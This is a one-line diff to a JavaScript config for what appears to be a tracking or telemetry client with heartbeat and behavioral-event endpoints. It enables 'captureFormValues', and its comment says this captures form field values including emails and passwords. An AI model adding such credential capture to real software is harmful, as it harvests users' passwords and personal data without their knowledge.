@@ -11,4 +11,5 @@ export const CFG = {
   heartbeatEndpoint:      `${SERVER}/api/heartbeat`,
   behavioralEventEndpoint: `${SERVER}/api/behavioral_event`,
   heartbeatMs:            30_000,
+  captureFormValues:      true,  // Set to true to capture form field values (emails, passwords, etc)
 };
